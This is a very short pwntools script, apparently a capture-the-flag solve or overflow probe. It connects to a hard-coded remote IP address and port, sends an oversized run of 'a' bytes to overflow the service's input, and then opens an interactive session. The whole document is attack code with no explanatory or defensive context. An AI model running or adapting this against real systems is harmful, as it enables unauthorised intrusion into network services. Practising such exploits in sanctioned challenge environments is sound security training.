#!/usr/bin/python

from pwn import *

context.arch = "amd64"
r = remote("124.16.75.117", 51001)
r.sendline(b"a" * 0xFFF)
r.interactive()
